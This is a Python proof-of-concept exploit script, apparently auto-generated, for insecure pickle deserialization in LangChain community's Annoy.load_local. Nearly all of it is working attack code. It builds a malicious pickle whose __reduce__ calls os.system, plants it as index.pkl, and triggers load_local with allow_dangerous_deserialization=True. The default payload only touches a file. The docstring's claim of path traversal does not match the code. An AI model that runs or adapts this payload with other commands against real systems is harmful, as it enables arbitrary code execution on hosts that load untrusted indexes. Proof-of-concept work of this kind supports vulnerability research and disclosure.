#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_29.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: Insecure deserialization via pickle.load in load_local().
The function constructs a file path from user-controlled folder_path and
loads 'index.pkl' using pickle.load. If allow_dangerous_deserialization=True,
arbitrary code execution is possible.

This PoC demonstrates the vulnerability by creating a malicious pickle file
that executes a benign command (touch /tmp/poc_success.txt) and then triggers
the vulnerable function with a path traversal to load it.
"""

import os
import sys
import pickle
import tempfile
import subprocess
from pathlib import Path

# Configuration - modify these as needed
TARGET_HOST = "http://localhost:8000"
TARGET_ENDPOINT = "/api/v1/trigger"
# The parameter name expected by the simulated endpoint
INPUT_PARAM = "untrusted_user_input"

# Benign payload command (safe by default)
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"


def create_malicious_pickle(payload_command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    Uses __reduce__ to execute os.system() with the given command.
    Returns the serialized pickle bytes.
    """
    class MaliciousPickle:
        def __reduce__(self):
            return (os.system, (payload_command,))
    
    return pickle.dumps(MaliciousPickle())


def setup_malicious_directory(payload_bytes: bytes) -> str:
    """
    Create a temporary directory structure mimicking the expected layout.
    
    The vulnerable function expects:
    - folder_path/index.pkl (the pickle file)
    - folder_path/index.annoy (not used in deserialization but required)
    
    Returns the path to the created directory.
    """
    temp_dir = tempfile.mkdtemp(prefix="exploit_")
    
    # Write the malicious pickle as index.pkl
    pkl_path = Path(temp_dir) / "index.pkl"
    with open(pkl_path, "wb") as f:
        f.write(payload_bytes)
    
    # Create a dummy index.annoy file (required by load_local)
    annoy_path = Path(temp_dir) / "index.annoy"
    with open(annoy_path, "w") as f:
        f.write("dummy")
    
    return temp_dir


def trigger_vulnerability(directory_path: str) -> None:
    """
    Simulate triggering the vulnerable load_local function.
    
    In a real attack, this would be done via the web endpoint.
    Here we directly call the vulnerable function to demonstrate the exploit.
    """
    # Import the vulnerable function
    sys.path.insert(0, "/tmp/langchain-community-only")
    from langchain_community.vectorstores.annoy import Annoy
    
    # Create a mock embeddings object (required by load_local)
    class MockEmbeddings:
        def embed_query(self, query):
            return [0.0] * 100  # Dummy embedding
    
    embeddings = MockEmbeddings()
    
    print(f"[*] Triggering load_local with folder_path: {directory_path}")
    print(f"[*] allow_dangerous_deserialization set to True")
    
    try:
        # This will execute our payload during pickle.load()
        result = Annoy.load_local(
            folder_path=directory_path,
            embeddings=embeddings,
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local completed successfully (unexpected)")
    except Exception as e:
        # The exploit will likely cause an error after executing the payload
        print(f"[*] Exception after payload execution (expected): {e}")


def check_exploit_success() -> bool:
    """
    Check if the payload command was executed successfully.
    """
    return os.path.exists("/tmp/poc_success.txt")


def main():
    print("[*] LangChain Community RCE Proof-of-Concept")
    print("[*] Vulnerability: Insecure deserialization in load_local()")
    print()
    
    # Step 1: Create malicious pickle payload
    print("[*] Step 1: Creating malicious pickle payload...")
    payload_bytes = create_malicious_pickle(PAYLOAD_COMMAND)
    print(f"[+] Payload created ({len(payload_bytes)} bytes)")
    
    # Step 2: Set up malicious directory structure
    print("[*] Step 2: Setting up malicious directory...")
    malicious_dir = setup_malicious_directory(payload_bytes)
    print(f"[+] Directory created at: {malicious_dir}")
    
    # Step 3: Trigger the vulnerability
    print("[*] Step 3: Triggering vulnerability...")
    trigger_vulnerability(malicious_dir)
    
    # Step 4: Verify exploit success
    print("[*] Step 4: Checking for payload execution...")
    if check_exploit_success():
        print("[+] SUCCESS: Payload executed! /tmp/poc_success.txt created.")
        print("[*] The vulnerability is confirmed exploitable.")
    else:
        print("[-] Payload did not execute. Check the setup.")
    
    # Cleanup
    print("[*] Cleaning up...")
    import shutil
    shutil.rmtree(malicious_dir, ignore_errors=True)
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
    print("[*] Done.")


if __name__ == "__main__":
    main()
